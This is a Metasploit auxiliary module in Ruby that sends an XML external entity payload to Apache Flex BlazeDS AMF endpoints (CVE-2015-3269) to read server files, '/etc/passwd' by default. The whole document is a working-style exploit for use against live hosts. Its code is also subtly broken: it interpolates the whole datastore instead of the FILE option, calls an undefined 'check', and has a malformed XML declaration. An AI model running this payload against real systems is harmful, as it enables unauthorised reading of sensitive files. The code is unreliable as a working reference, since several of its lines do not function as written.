##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'        => 'Adobe XML External Entity Injection',
      'Description' => %q{
          XXE vulnerability in Apache Flex BlazeDS/Adobe . The vulnerable code can be found in the BlazeDS Remoting/AMF protocol implementation.
      },
      'References'  =>
        [
          [ 'CVE', '2015-3269' ],
          [ 'URL', 'https://codewhitesec.blogspot.com/2015/08/cve-2015-3269-apache-flex-blazeds-xxe.html'],
        ],
       'Author'      => ['Mateus Lino' ],
      'License'     => MSF_LICENSE
      )

    register_options(
      [
        Opt::RPORT(8080),
        OptString.new('FILE', [ true,  "File Acess", '/etc/passwd']),
      ])
  end

  def run_host(ip)
    path_uri = ["/app-web/messagebroker/amf"]

    payload_post =  "<xml version='1.0' encoding='ISO-8859-1' ?>"
    payload_post << "<!DOCTYPE foo ["
    payload_post << "<!ELEMENT foo ANY >"
    payload_post << "<!ENTITY xxe SYSTEM '#{datastore}' >]><foo>&xxe;</foo>"
    res = send_request_cgi({
        'uri'     => path_uri,
        'method'  => 'POST',
        'version'      => '1.1',
        'Content-Type' => 'application/x-amf',
        'data'         => payload_post
      }, 25)
      if (res.nil?)
        print_error("Not response for #{ip}:#{rport} #{check}")
      elsif (res.code == 200 and res.body =~ /\<\?xml version\="1.0" encoding='ISO-8859-1' \?\>/)
        print_status("#{rhost}:#{rport} #{check} #{res.code}\n #{res.body}")
      elsif (res and res.code == 302 or res.code == 301)
        print_status("302 Redirect to: #{res.headers['Location']} for #{check}")
      else
        print_error("#{res.code} for #{check}")
        #''
      end
  rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, Rex::ConnectionError =>e
    print_error(e.message)
  rescue Timeout::Error, Errno::EINVAL, Errno::ECONNRESET, EOFError, Errno::ECONNABORTED, Errno::ECONNREFUSED, Errno::EHOSTUNREACH =>e
    print_error(e.message)
  end
end

